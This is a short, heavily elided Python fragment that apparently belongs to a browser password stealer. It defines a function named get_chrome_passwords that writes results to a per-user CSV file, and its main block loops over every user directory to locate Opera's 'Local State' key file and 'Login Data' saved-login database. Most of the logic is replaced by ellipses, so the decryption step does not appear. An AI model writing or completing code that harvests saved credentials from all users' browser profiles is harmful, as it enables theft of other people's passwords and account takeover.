...
def get_chrome_passwords(db_path, secret_key, user_folder):
    ...
    try:
        ...
        csv_file_path = f'{user_folder}_opera.csv'
...
if __name__ == "__main__":
    ...
    for user_directory in find_users_directory():
        local_state_path = os.path.join(user_directory, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Local State')
        login_data_path = os.path.join(user_directory, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Login Data')
